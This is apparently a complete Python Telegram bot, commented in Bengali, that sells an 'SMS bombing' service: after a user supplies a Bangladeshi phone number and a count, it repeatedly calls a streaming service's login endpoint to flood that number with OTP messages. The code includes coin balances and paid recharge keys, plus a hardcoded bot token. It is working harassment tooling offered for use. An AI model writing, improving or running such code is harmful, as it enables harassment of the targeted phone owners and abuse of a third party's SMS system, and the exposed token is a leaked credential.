import telebot
import requests
import json
import os
import time
import threading
from telebot import types

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 6363065063 
LOG_CHANNEL = "@sMsBotManagerDUModz"
REQUIRED_CHANNEL = "@DemoTestDUModz"
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN)

# --- ডাটাবেস হ্যান্ডলার ---
def load_db(file, default_val):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump(default_val, f)
    with open(file, 'r') as f: return json.load(f)

def save_db(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

users = load_db('users.json', {})
keys = load_db('keys.json', {})

# --- মেম্বারশিপ চেক ---
def check_join(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- কিবোর্ড মেনু ---
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start SMS", callback_data="bomb"),
        types.InlineKeyboardButton("👤 Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Recharge", callback_data="recharge"),
        types.InlineKeyboardButton("📢 Channel", url="https://t.me/DemoTestDUModz"),
        types.InlineKeyboardButton("🌐 Website", url="https://darkunkwonmodz.blogspot.com")
    )
    return markup

# --- স্টার্ট কমান্ড ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    if uid not in users:
        users[uid] = {"coins": 30, "status": "active", "sent": 0}
        save_db('users.json', users)
        bot.send_message(LOG_CHANNEL, f"✨ **New User:** `{uid}`\n👤 **Name:** {message.from_user.first_name}")

    if not check_join(uid):
        m = types.InlineKeyboardMarkup()
        m.add(types.InlineKeyboardButton("Join Channel", url="https://t.me/DemoTestDUModz"))
        m.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
        bot.send_photo(message.chat.id, LOGO_URL, "⚠️ **Please join our channel first!**", reply_markup=m)
        return

    bot.send_photo(message.chat.id, LOGO_URL, "🔥 **Welcome to Dark Unkwon ModZ** 🔥\n\n🛡️ *Security Verified*\n⚡ *Status: 100% Smooth*", reply_markup=main_menu())

# --- কলব্যাক লজিক ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    uid = str(call.from_user.id)
    
    if call.data == "verify":
        if check_join(uid):
            bot.edit_message_caption("✅ Verified! Welcome.", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
        else:
            bot.answer_callback_query(call.id, "❌ Join first!", show_alert=True)

    elif call.data == "profile":
        u = users[uid]
        bot.send_message(call.message.chat.id, f"👤 **Your Profile**\n\n💰 Coins: `{u['coins']}`\n📊 Status: `{u['status'].upper()}`\n🚀 Sent: `{u['sent']}`")

    elif call.data == "recharge":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Recharge Key:**")
        bot.register_next_step_handler(msg, process_recharge)

    elif call.data == "bomb":
        if users[uid]['status'] == "blocked":
            bot.send_message(call.message.chat.id, "🚫 You are blocked!")
            return
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Number (10 digit):**")
        bot.register_next_step_handler(msg, get_num)

# --- রিচার্জ লজিক ---
def process_recharge(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        val = keys[key]
        if val == "lifetime":
            users[uid]['status'] = "lifetime"
        else:
            users[uid]['coins'] += int(val)
        
        del keys[key] # একবার ব্যবহার হলে ডিলিট
        save_db('keys.json', keys)
        save_db('users.json', users)
        bot.send_message(message.chat.id, "✅ **Recharge Successful!** Key has been expired.")
    else:
        bot.send_message(message.chat.id, "❌ **Invalid Key!** Please buy a new key.")

# --- এসএমএস বোম্বিং ---
def get_num(message):
    num = message.text
    if len(num) == 10 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **Enter Amount (Max 100):**")
        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
    else:
        bot.send_message(message.chat.id, "❌ Invalid Number!")

def start_attack(message, num):
    try:
        amount = int(message.text)
        uid = str(message.from_user.id)
        cost = amount * 5
        
        if users[uid]['status'] != 'lifetime' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, f"⚠️ **Insufficient Coins!** Need {cost}")
            return
            
        bot.send_message(message.chat.id, f"🚀 **Attack Sent to {num}!**")
        threading.Thread(target=bomb_logic, args=(uid, num, amount, cost)).start()
    except: bot.send_message(message.chat.id, "❌ Error!")

def bomb_logic(uid, num, amount, cost):
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {'User-Agent': "Mozilla/5.0", 'Content-Type': "application/json"}
    payload = {"number": "+880" + num}
    
    success = 0
    for _ in range(amount):
        try:
            r = requests.post(url, json=payload, headers=headers)
            if r.status_code == 200: success += 1
        except: pass
        time.sleep(0.5)

    if users[uid]['status'] != 'lifetime':
        users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    save_db('users.json', users)

# --- এডমিন প্যানেল ---
@bot.message_handler(commands=['gen'])
def gen(message):
    if message.from_user.id != ADMIN_ID: return
    # /gen 500 or /gen lifetime
    val = message.text.split()[1]
    key = "DU-KEY-" + os.urandom(3).hex().upper()
    keys[key] = val
    save_db('keys.json', keys)
    bot.reply_to(message, f"🔑 **Key:** `{key}`\n💰 **Value:** {val}")

bot.infinity_polling()
